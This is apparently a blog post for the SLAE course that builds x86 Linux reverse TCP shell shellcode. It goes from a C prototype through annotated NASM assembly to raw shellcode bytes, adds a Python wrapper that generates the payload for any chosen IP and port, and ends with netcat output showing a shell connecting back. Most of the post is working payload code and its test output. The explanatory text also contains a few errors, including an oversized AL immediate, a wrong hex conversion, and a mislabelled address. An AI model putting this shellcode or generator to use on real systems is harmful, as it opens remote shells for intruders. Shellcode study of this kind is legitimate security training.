---
layout: single
title: SLAE Assignment 2 -- TCP Reverse Shell
date: 2019-5-7
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

The second SLAE assignment is to develop shellcode for a reverse TCP shell. What is a reverse TCP shell? According to [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref), a reverse shell is "a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved."

After spending so much overhead on the last assignment learning how to format socket programming arguments and how to research them, I found this assignment to be much easier. It also helps that over 90% of the code was reused from the last assignment! ***I am not a professional programmer, I apologize for any socket programming concepts I butchered in my explanations.***

## Prototype

The first thing we want to do, in order to see the syscalls required to support the creation of a reverse shell, is find the simplest implementation of a reverse shell in a language higher than assembly. After a bit of googling, the simplest version of a reverse shell in C that I could find is the [following](https://gist.github.com/0xabe-io/916cf3af33d1c0592a90), with my comments added:

```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "XXX.XXX.XXX.XXX"
#define REMOTE_PORT XXX

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;
    //creating our struct
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);
    //first syscall socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    //second syscall connect
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    //third syscall dup2
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    
    //final syscall execve
    execve("/bin/sh", 0, 0);
    return 0;
}
```
After confirming that the code does indeed work by setting the REMOTE_ADDR to "127.0.0.1" and the port to 443 and trying it on my Kali machine, it's become apparent we need to execute 4 syscalls in our assembly code:
+ ***socket***
+ connect
+ ***dup2***
+ ***execve***
+ ***execve***

The syscalls I've highlighted, we already have code for from Assignment #1. Connect actually behaves very similarly to bind, with pretty much the only difference being we won't be specifying a local interface IP address but rather a remote IP address so it's unlikely to be 0.0.0.0 in our reverse shell code. 

## Building Our Assembly Code

### Assembly Skeleton Code
```nasm
global_start

section .txt
_start:
```
The first thing we want to do is to clear out the registers we're going to use immediately. How do we know what registers we want to use? You can think of your syscall as something like an argv[0] in a command line program. So that's always going to correspond with the first register, EAX. Subsequent arguments will follow sequentially: argv[1] will correspond to EBX, argv[2] will correspond to ECX, etc.

If we consult `man 2 socket` for our first syscall, socket, we see that it takes 3 arguments in the following fashion:`int socket(int domain, int type, int protocol);`

So counting the syscall itself and its 3 arguments, we need to clear the first 4 registers so that we can work with those. Let's clear them by XOR'ing them with themselves so that we clear them in a way that does not introduce NULL BYTEs into our shellcode.

```nasm
global_start

section .txt
_start: 
  
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
```

## Socket Syscall

Let's now figure out what we're going to put into EAX to call socket. We can do this with a `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket` which tells us that the code for socket is 359. Popping 359 as decimal into a hex converter tells us that the hex equivalent is `0x167`, so let's place that in the low space of EAX so as to not introduce any NULL BYTEs with padding. 

```nasm
    mov al, 0x167
```

Now let's start with the arguments. `man 2 socket` tells us that the first argument is `int domain` which we see in the man page is `AF_INET` for IPv4. Let's just google 'value for AF_INET' and see what value we should use in the argument. Our first [result](http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html) is a university webpage which looks to be a header file explaining not only the value of `AF_INET` but also of `SOCK_STREAM` which is going to be our second value to satisfy the `int type` argument. According to the file, `AF_INET` is 2 and `SOCK_STREAM` is 1 (`0x02` and `0x01`) respectively. The last argument value for `int protocol` is going to be '0' according to the man page. So we need the following register and value combinations:
+ EBX == 0x02
+ ECX == 0x01
+ EDX == 0

Let's make these changes to our assembly code. If you remember, we already cleared EDX, so our zero value is already accounted for, so need to mess with that register at all. 

```nasm
    mov bl, 0x02
    mov cl, 0x01
```

Next we need to pass control to the [interrupt vector](https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code) in order to handle our syscall (socket). 

```nasm
    int 0x80
```

Lastly, before moving on, we will need a way to identify this socket we've just created to subsequent systemcalls. We can do this by storing the value of EAX off to the side so that we can reference it later and still use EAX in our subsequent systemcalls. I chose to store this value in EDI as EDI is pretty far down our list of registers we'd fill arguments with, no idea if this makes sense, but it worked!

```nasm
    mov edi, eax
```

## Connect Syscall

First thing we want to do here is clear out EAX so that we can put the value of our connect call into the lower part of the register as we did above with socket. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep connect` gives us a value of 362 which is `0x169`

Let's make these changes to our code

```nasm
    xor eax, eax
    mov al, 0x16a
```

Now we need to consult `man 2 connect` to figure out the structure of the arguments this syscall requires. The result is `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

These arguments can be summarized at a high-level as follows: 
+ `int sockfd` -- this is a reference to the socket we just created, this is why we moved EAX into EDI 
+ `const struct sockaddr *addr` -- this is a pointer to the location on the stack of the sockaddr struct we are going to create
+ `socklen_t addrlen` -- this is the length of the address which the `/usr/include/linux/in.h` file tells us is 16

Let's start with satisfying the `int sockfd` argument. 

```nasm
    mov ebx, edi
```

Now, let's start creating our sockaddr struct on the stack. A [sockets programming tutorial](http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf) tells us that the sockaddr_in struct for the connect syscall consists of the following 4 components:
+ AF_INET
+ Port Number
+ Internet address (IP)
+ 0

Let's start moving these values into the registers. Our port number will be 5555 and our internet address will be 0.0.0.0

Because the stack grows from High to Low, we will have to place these arguments onto the stack in reverse order. We will also have to put our port number in Little Endian format, so instead of `0x15b3`, we will place `0xb315` onto the stack. We will also have to push our IP address onto the stack in reverse order so instead of `127.0.0.1`, we will require `1.0.0.127`. First let's push our 0 onto the stack with a cleared out ECX.

```nasm
    xor ecx, ecx
    push ecx
```

Now it's time to confront the NULL BYTE demon. We want to push `1.0.0.127` onto the stack but we cannot call 0's explicitly as this will result in NULL BYTEs in our shellcode. A work around can be to move `2.1.1.128` into a register and then subtract `1.1.1.1` from the register to end up at our desired `1.0.0.127`. Let's do that now.

```nasm
    mov ecx, 0x02010180
    sub ecx, 0x01010101
```

Now we push ECX onto the stack and continue on as we did in Assignment #1 for pretty much the rest of our assembly code. 

```nasm
    push ecx
    push word 0xb315
    push word 0x02
```

Boom! Struct completed. Let's put the pointer to this entity into the ECX register so that we can satisfy our `const struct sockaddr *addr` argument. We'll also put 16 into the low part of the EDX register and call the interrupt again while we're here since that's easy enough. 

```nasm 
    mov ecx, esp
    mov dl, 16
    int 0x80
```

## Dup2 Syscall 

If we reference our C prototype, we see that the dup2 call is iterating 3 times in order to duplicate into our accepted connection the STDIN (0), STDOUT (1), and STDERR (2) file descriptors which makes the connection interactive for the user. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2` gives a syscall code of 63 (`0x3f`). 

Since we're iterating through this call 3 times, we'll need to set up a loop. We can utilize ECX for this as it's known as the 'counter register.' We'll place a value of 3 into the lower part of ECX and have our loop iterate as long as the zero flag is not set with a `jnz` op code. So as long as the zero flag is not set, which is to say that ECX hasn't been decremented to zero, our code will jump back up to the beginning of the loop and execute it again. 

All that dup2 requires for an argument is the `int sockfd` which was newly created in our accept syscall and stored in EDI. 

```nasm
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    
    mov cl, 0x3     ; putting 3 in the counter
    
    loop_dup2:      
    xor eax, eax   
    mov al, 0x3f    ; putting the syscall code into the lower part of eax
    mov ebx, edi    
    dec cl          ; decrementing cl by one
    int 0x80
    
    jnz loop_dup2   ; jumping back to the top of loop_dup2 if the zero flag is not set
```

## Execve Syscall

Finally, we need to tell the program what to do once everything we've done so far is complete. In our case, we want the program to execute `/bin/sh`. 

`cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve` gives us 11 (`0x0b`). 

Let's clear out EAX

```nasm
    xor eax, eax
```

We will be utilizng the stack for these arguments. So we will be doing things in slightly a different order than our previous syscalls. This particular syscall requires null terminators and pointers to stack locations. Remember the stack grows from High to Low so first we need to put a terminator onto the stack.

```nasm
    push eax
```

Next, we need to place the string `/bin/sh` onto the stack in reverse order. However, before we do this and in order to avoid NULL BYTEs in our shellcode, we need to make sure that the string is divisable by 4. Right now, it's 7 characters so we add an additional character to make it an even 8. `//bin/sh`

```nasm
    push 0x68732f6e
    push 0x69622f2f
```

Next, we need EBX to carry the pointer location of the entity we just created on the stack. 

```nasm
    mov ebx, esp
```

Next, we will need another zeroed out value to be pointed to for EDX, so let's push EAX onto the stack once more and then assign the ESP to EDX.

```nasm
    push eax
    mov edx, esp
```

Finally, ECX should point to the location of EBX. So we'll push EBX onto the stack and then move ESP into ECX. 

```nasm 
    push ebx
    mov ecx, esp
```

Now we can put our `0x0b` into the lower portion of EAX and call our interrupt. 

```nasm
    mov al, 0x0b
    int 0x80
```

## Completed Assembly Code 

```nasm
global_start

section .text
_start:

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; SYS CALL #1 = socket()
	
	mov ax, 0x167
	mov bl, 0x02
	mov cl, 0x01
	
	int 0x80
	mov edi, eax

	; SYS CALL #2 = connect()

	xor eax, eax
	mov ax, 0x16a 
	mov ebx, edi
	xor ecx, ecx
	push ecx		; pushing our 8 bytes of zero as per: home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf
				      
	
	mov ecx, 0x02010180     ; moving 2.1.1.128 into ecx
	sub ecx, 0x01010101     ; subtracting 1.1.1.1 from ecx
	
	push ecx		      ; putting 1.0.0.127 onto the stack (null free)
	push word 0xb315	      ; port 5555
	push word 0x02		      ; AF_INET
	
	mov ecx, esp
	mov dl, 16
	
	int 0x80

	; SYSCALL #3 = dup2()

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov cl, 0x3
	
	loop_dup2:
	mov al, 0x3f
	mov ebx, edi
	dec cl
	int 0x80
	
	jnz loop_dup2

	; SYSCALL #6 = execve()
 
  	xor eax, eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0x0b

  	int 0x80

```

## Shellcode

To get our shellcode, we can run this nifty command `objdump -d ./<PROGRAM>|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'`

Our shellcode is: 
```terminal_session
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xb9\x80\x01\x01\x02\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Looks to be null free!

## Python Wrapper

The next criteria we have to satisfy for the assignment, is to have the shell code created dynamically with user input for an IP address and port number. I have created a python wrapper to accomplish this. ***NOTE:*** I tried to make the wrapper capabale of supporting IP address inputs with zeroes in them by using the same method we used in our assembly code; however, adding `1.1.1.1` to the user provided IP address will break the wrapper if the user inputs an address with an octet value of `255`.

```python
#!/usr/bin/python

import socket
import sys
import binascii

shell1 = ""
shell1 += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80"
shell1 += "\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\xb9"
shell2 = ""
shell2 += "\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
shell3 = ""
shell3 += "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10"
shell3 += "\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb1\\x03\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80"
shell3 += "\\x75\\xf6\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50"
shell3 += "\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 3:
	print 'Usage: wrapper.py <host IP> <port>'
	exit

ip = sys.argv[1]

ip = ip.split('.')

ip1 = int(ip[0]) + 1
ip2 = int(ip[1]) + 1
ip3 = int(ip[2]) + 1
ip4 = int(ip[3]) + 1

newip = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)

newHex = binascii.hexlify(socket.inet_aton(newip))

newHex = "\\x" + str(newHex)[0:2] + "\\x" + str(newHex)[2:4] + "\\x" + str(newHex)[4:6] + "\\x" + str(newHex)[6:8]

portNumber = sys.argv[2]
portNumber = int(portNumber)
portNumber = socket.htons(portNumber)
portNumber = hex(portNumber)

portNum1 = portNumber[2:4]
portNum2 = portNumber[4:6]

portNum1 = str(portNum1)
portNum1 = "\\x" + portNum1

portNum2 = str(portNum2)
portNum2 = "\\x" + portNum2

combined = portNum2 + portNum1

shell = shell1 + newHex + shell2 + combined + shell3

		
print shell
```

Let's test out our wrapper!

```terminal_session
SLAE@ubuntu:~/SLAE/Exam$ python wrapper.py 192.168.1.188 1234
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xb9\xc1\xa9\x02\xbd\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Now, we paste this shellcode into our shellcode.c program

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xb9\xc1\xa9\x02\xbd\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

## Final Testing

I set up a netcat listener on my Kali machine at 192.168.1.188 and then compiled the shellcode.c program with `gcc -fno-stack-protector -z execstack -m32 shellcode.c -o rev_shell` and ran `./rev_shell`

```terminal_session
SLAE@ubuntu:~/SLAE/Exam$ ./rev_shell
Shellcode Length:  99
```

```terminal_session
root@astrid:~/petprojects# nc -lvp 1234
listening on [any] 1234 ...
192.168.1.192: inverse host lookup failed: Unknown host
connect to [192.168.1.188] from (UNKNOWN) [192.168.1.192] 57324
id
uid=1000(SLAE) gid=1000(SLAE) groups=1000(SLAE),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
pwd
/home/SLAE/SLAE/Exam
```

It works!!

## Github Repo 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment2)

